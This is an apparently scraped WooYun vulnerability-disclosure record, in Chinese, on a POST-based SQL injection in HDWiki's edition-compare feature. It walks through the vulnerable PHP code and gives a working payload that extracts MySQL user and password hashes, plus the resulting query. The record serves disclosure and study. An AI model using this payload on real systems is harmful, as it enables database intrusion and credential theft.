{"id": 45097, "wybug_id": "wooyun-2014-088613", "wybug_title": "hdwiki 一处sql注入", "wybug_corp": "互动在线（北京）科技有限公司", "wybug_author": "Power", "wybug_date": "2014-12-25 17:19", "wybug_open_date": "2015-04-02 10:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-30：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： 费了些力气，不过还是不错的。注入，不过不是get方式，规则绕不过去，求大牛们秒了它，post方式注入，不过这个漏洞感觉很有意思。最后再说，别不给确认，不给rank 详细说明：  先来看看Hdwiki处理提交数据的方式，get就算了，各种绕不过。在/hdwiki/model/hdwiki.class.php中大约 52行\n$this->post = string::haddslashes($_POST); //跟入\nhaddslashes函数如下,可以看到POST过来的数据处理addslashes(单引号，双引号,反斜杠，NULL)下\nfunction haddslashes($string, $force = 0) {\t\tif(!MAGIC_QUOTES_GPC || $force) {\t\t\tif(is_array($string)) {\t\t\t\tforeach($string as $key => $val) {\t\t\t\t\t$string[$key] = string::haddslashes($val, $force);\t\t\t\t}\t\t\t}else {\t\t\t\t$string = addslashes($string);\t\t\t}\t\t}\t\treturn $string;\t}\n再来看/hdwiki/control/edition.php中function docompare()\nfunction docompare(){\t\tif(!empty($this->setting['check_useragent'])) {\t\t\t$this->load('anticopy');\t\t\tif(!$_ENV['anticopy']->check_useragent()){\t\t\t\t$this->message('禁止访问','',0);\t\t\t}\t\t}\t\tif(!empty($this->setting['check_visitrate'])) {\t\t\t$this->load('anticopy');\t\t\t$_ENV['anticopy']->check_visitrate();\t\t}\t\tif ($this->get[4] == 'box'){\t\t\t@header('Content-type: text/html; charset='.WIKI_CHARSET);\t\t\tif(!@is_numeric($this->get[2])||!@is_numeric($this->get[3])){\t\t\t\t$this->message($this->view->lang['parameterError'],'index.php',0);\t\t\t}\t\t\t$did = $this->get[2];\t\t\t$eid = $this->get[3];\t\t\t$edition = array();\t\t\t\t$editions=$_ENV['doc']->get_edition_list($did,'`time`,`authorid`,`author`,`words`,`images`,`content`', $eid);\t\t\t\t\t\t$this->view->assign('edition',$editions);\t\t\t$this->view->display('comparebox');\t\t\texit;\t\t}\t\tif(@!is_numeric($this->post['eid'][0])||@!is_numeric($this->post['eid'][1])){  //这个地方程序判断的是数组中第一及第二个是否为数字，我们post数据为eid[0]=num,eid[1]=num就可以绕过去执行下面的函数了。\t\t\t$this->message($this->view->lang['parameterError'],'index.php',0);\t\t}\t\t$edition=$_ENV['doc']->get_edition($this->post['eid']);    //这个地方产生问题，跟踪进入get_edition函数\t....省略代码\n来看get_edition函数\nfunction get_edition($eid){\t\t$editionlist=array();\t\tif(is_numeric($eid)){  //这个地方判断$eid是否为数字，我们传过来的肯定不是数字了，这个if下不用看了，直接到了else中。\t\t\t$edition= $this->db->fetch_first(\"SELECT * FROM \".DB_TABLEPRE.\"edition WHERE eid=$eid\");\t\t\tif($edition){\t\t\t\t$edition['comtime']=$edition['time'];\t\t\t\t$edition['time']=$this->base->date($edition['time']);\t\t\t\t$edition['rawtitle']=$edition['title'];\t\t\t\t$edition['title']=htmlspecialchars($edition['title']);\t\t\t\tif(!$edition['content']){\t\t\t\t\t$edition['content']=file::readfromfile($this->get_edition_fileinfo($edition['eid'],'file'));\t\t\t\t}\t\t\t}\t\t\treturn $edition;\t\t}else{  //函数运行到了这里，到这就直接带入查询了，所以产生问题。\t\t\t$query=$this->db->query(\" SELECT * FROM \".DB_TABLEPRE.\"edition WHERE eid IN ($eid)\");\t\t\twhile($edition=$this->db->fetch_array($query)){\t\t\t\t$edition['time']=$this->base->date($edition['time']);\t\t\t\t$edition['rawtitle']=$edition['title'];\t\t\t\t$edition['title']=htmlspecialchars($edition['title']);\t\t\t\tif(!$edition['content']){\t\t\t\t\t$edition['content']=file::readfromfile($this->get_edition_fileinfo($edition['eid'],'file'));\t\t\t\t}\t\t\t\t$editionlist[]=$edition;\t\t\t}\t\t\treturn $editionlist;\t\t}\t}\n查询函数如下\nfunction query($sql, $type = 'SILENT'){\t\tglobal $mquerynum;\t\t$func = $type == 'UNBUFFERED' && @function_exists('mysql_unbuffered_query') ? 'mysql_unbuffered_query' : 'mysql_query';//        echo \"<br>\";//        var_dump($func);  //string(11) \"mysql_query\" //        echo \"<br>\";//        var_dump($this->mlink);  //resource(13) of type (mysql link) //        echo \"<br>\";\t\t\t\tif(!($query = $func($sql, $this->mlink)) && $type != 'SILENT'){ //这个地方不会爆错。\t\t\t$this->halt(\"MySQL Query Error\",'TRUE',$sql);\t\t}\t\t$mquerynum++;\t\treturn $query;\t}\n   漏洞证明：  Hdwiki中不能够报错输出，可以使用盲注之类的方法来输出数据，直接输出下吧，剩下的就是工具跑下。首先注册一个用户然后如下访问url 后边的19 3不一定非要这样。\nhdwiki/hdwiki/index.php?edition-compare-19-3\n然后post数据为，要是GET就完了，各种过滤啊。\neid[0]=1&eid[1]=2&eid[3]=ss) and exists(select*from (select*from(select name_const((select concat(user,password) from mysql.user limit 0,1),0))a join (select name_const((select concat(user,password) from mysql.user limit 0,1),0))b)c) #(\n如下图\n\n最后来看下数据库中执行语句。\nSELECT * FROM wiki_edition WHERE eid IN (1,2,ss) and exists(select*from (select*from(select name_const((select concat(user,password) from mysql.user limit 0,1),0))a join (select name_const((select concat(user,password) from mysql.user limit 0,1),0))b)c) #()\n数据如下\n\n   修复方案：  过滤了这么多，你们应该很专业。   版权声明：转载请注明来源 Power@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 10:23 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-01 21:52 |    \t\tNeeke \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:24        | 求传授刷Rank方法？)\t\t \n  最后再说，别不给确认，不给rank    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}